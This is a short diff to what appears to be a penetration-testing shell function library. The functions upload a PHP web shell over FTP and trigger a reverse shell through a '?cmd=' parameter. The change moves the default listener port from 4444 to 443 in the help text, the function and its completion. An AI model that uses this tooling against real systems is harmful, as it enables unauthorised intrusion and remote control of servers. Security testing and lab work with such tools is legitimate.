@@ -378,7 +378,7 @@ _ftp-shell-help() {
   echo "  -U <url>     full shell URL (skip path math; for -u trigger)"
   echo "  -n <name>    remote filename (default: shell.php)"
   echo "  -p <path>    local payload file"
-  echo "  -P <port>    revshell port (ftp-revshell only, default: 4444)"
+  echo "  -P <port>    revshell port (ftp-revshell only, default: 443)"
   echo "  -u           skip upload (ftp-revshell only)"
   echo ""
   echo "per-case: cases/<name>/ftp-shell   session: export FTP_SHELL_*"
@@ -451,7 +451,7 @@ ftp-put-shell() {
 
 # upload (optional) + trigger reverse shell via ?cmd=
 ftp-revshell() {
-  local port="4444" ip="" skip_upload=false
+  local port="443" ip="" skip_upload=false
   local -a put_opts=()
 
   while [[ $# -gt 0 ]]; do
@@ -530,7 +530,7 @@ _ftprsh() {
     '-P[listener port]:port:' \
     '-d[remote dir]:directory:' \
     '-w[web prefix]:prefix:' \
-    '1:port:(4444 5555)' \
+    '1:port:(443 5555)' \
     '2:ip:($IP)'
 }
 
